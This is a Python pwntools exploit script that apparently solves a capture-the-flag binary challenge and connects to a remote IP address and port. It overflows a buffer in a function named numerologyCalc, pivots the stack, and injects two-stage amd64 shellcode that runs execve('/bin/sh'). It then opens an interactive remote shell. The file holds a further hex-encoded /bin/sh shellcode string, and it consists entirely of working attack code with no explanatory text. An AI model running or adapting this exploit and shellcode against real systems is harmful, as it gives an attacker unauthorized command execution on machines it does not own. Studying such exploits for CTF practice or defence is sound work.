from pwn import *
from time import sleep
p = remote('143.255.251.233', 13373)
#pid = gdb.attach(p,gdbscript="""
 #       b  *numerologyCalc+195

  #      """)
puts_plt=p64(0x401040)
puts_got=p64(0x404020)


pop_rdi_ret = p64(0x000000000040153b)
addr = p64(0x0401417)
addr2 = p64(0x040145e)

padd = 'A' * 28
payload = padd
payload += p64(0x404500)
payload +=addr

p.sendlineafter(": ",payload)
#sc1 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sc1 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"  
sc = asm("""
        xor eax,eax
        xor edi, edi
        mov esi, 0x404600
        mov edx, 0x30
        syscall
        mov eax, 0x404600
        jmp rax
""",
arch='amd64',
os ='linux'
)

scf = asm("""
        mov rax, 0x3b
        mov rdi, 0x404500
        mov rsi, 0x404700
        mov rdx, 0x404700
        syscall
""",
arch='amd64',
os ='linux'
)

payload2 = "BBBB"
payload2 += sc
payload2 +='\0'
payload2 += "/bin/sh\0" 
payload2 += p64(0x4044e8)
payload2 += 'FFFF'
p.send(payload2)


p3 = scf
p3 += "\0" * (0x30-len(scf))

p.send(p3)

p.interactive()
